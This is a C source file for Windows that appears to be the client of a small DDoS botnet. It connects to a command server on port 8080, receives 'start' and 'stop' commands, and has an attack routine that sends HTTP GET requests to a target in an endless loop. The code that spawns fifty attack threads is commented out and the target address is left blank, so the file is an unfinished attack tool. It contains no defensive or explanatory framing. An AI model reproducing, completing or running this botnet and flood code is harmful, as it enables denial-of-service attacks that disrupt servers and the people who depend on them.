#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <winuser.h>

void startWinsock(WSADATA *wsaData);
SOCKET startSocket();
void connectSocket(struct sockaddr_in *serv_addr, SOCKET client_socket,  const char* server_ip);
void sendMsg(SOCKET client_socket, const char *msg);
void closeSocket(SOCKET client_socket);
DWORD WINAPI attack(LPVOID target_ip);
void receiveCommand(SOCKET client_socket, char *cmd);

struct address{
    const char* ip;
    int port;
};

volatile int running = 0;

int main() {

    char cmd_buff[1024];
    char output_buff[1024]; 

    // server socket details and setup
    SOCKET server_socket;
    struct sockaddr_in serv_addr;
    WSADATA wsaData;
    serv_addr.sin_family = AF_INET;
    serv_addr.sin_port = htons(8080);
    const char* server_ip = "127.0.0.1";

    startWinsock(&wsaData);
    server_socket = startSocket();
    connectSocket(&serv_addr, server_socket, server_ip);

    while (1) {
        memset(cmd_buff, 0, 1024);
        memset(output_buff, 0, 1024);
        receiveCommand(server_socket, cmd_buff);

        if (strcmp(cmd_buff, "start") == 0){
            struct address target_addr;
            target_addr.ip = "";
            target_addr.port = 80;
            printf("Executing attack...\n");
            // for (int i=0; i<50; i++){
            //     HANDLE attack_thread = CreateThread(NULL, 0, attack, (LPVOID)&target_addr, 0, NULL);
            //     // printf("Thread created");
            //     if (attack_thread == NULL){
            //         printf("error creating thread \n");
            //     }
            // }
            // while (1){
            //     ;
            // }
        } else if (strcmp(cmd_buff, "stop") == 0){
            printf("Stopping attack...\n");
            // closeSocket(server_socket);
            // break;
        }
    }

    return 0;
}

DWORD WINAPI attack(LPVOID addr){
    struct address target = *(struct address*)addr;
    const char* target_ip = target.ip;
    int port = target.port;
    SOCKET target_socket;
    struct sockaddr_in target_addr;
    WSADATA wsaData;
    target_addr.sin_family = AF_INET;
    target_addr.sin_port = htons(port);
    startWinsock(&wsaData);
    target_socket = startSocket();
    connectSocket(&target_addr, target_socket, target_ip);
    char msg[64];
    int sprintf_stat = snprintf(msg, sizeof(msg), "GET / HTTP/1.1\r\nHost: %s\r\n\r\n", target_ip);
    // printf("%i", sprintf_stat);
    while(1){
        if (running){
            sendMsg(target_socket, msg);
        } else {
            ;
        }
    }
}

// function to initialize Winsock so that we can use sockets
void startWinsock(WSADATA *wsaData) {
    if (WSAStartup(MAKEWORD(2, 2), wsaData) != 0) {
        printf("WSAStartup failed\n");
        exit(EXIT_FAILURE);
    }
}

// function to start the socket and handles errors
SOCKET startSocket() {
    SOCKET client_socket = socket(AF_INET, SOCK_STREAM, 0);
    if (client_socket < 0) {
        printf("\n Socket creation error \n");
        WSACleanup();
        exit(EXIT_FAILURE);
    } else {
        printf("Socket created. \n");
    }
    return client_socket;
}

// function to connect this client to the server via socket
void connectSocket(struct sockaddr_in *addr, SOCKET socket, const char* ip) {

    if (inet_pton(AF_INET, ip, &addr->sin_addr) <= 0) {
        printf("\nInvalid address/ Address not supported \n");
        closesocket(socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else if (connect(socket, (struct sockaddr *)addr, sizeof(*addr)) < 0) {
        printf("\nConnection Failed. \n");
        printf("%i", socket);
        closesocket(socket);
        WSACleanup();
        exit(EXIT_FAILURE);
    } else{
        printf("Connection successful.\n");
    }
}

// function to send message via socket connection
void sendMsg(SOCKET socket, const char *msg) {
    int sent = send(socket, msg, strlen(msg), 0);
    if (sent == -1){
        printf("Error sending message. The connection must have been cut.\n");
    } else{
        printf("%s sent, status = %i \n", msg, sent);
    }
}

// function to close the socket and clean up the resources that are no longer being used
void closeSocket(SOCKET socket) {
    int stat1 = closesocket(socket);
    int stat2 = WSACleanup();
    if (stat1 == 0 && stat2 == 0 ){
        printf("Connection closed. \n");
    }
}

void receiveCommand(SOCKET client_socket, char *cmd){
    int received = recv(client_socket, cmd, 1024, 0);
    if (received < 1){
        printf("Error receiving message.\n");
    }
}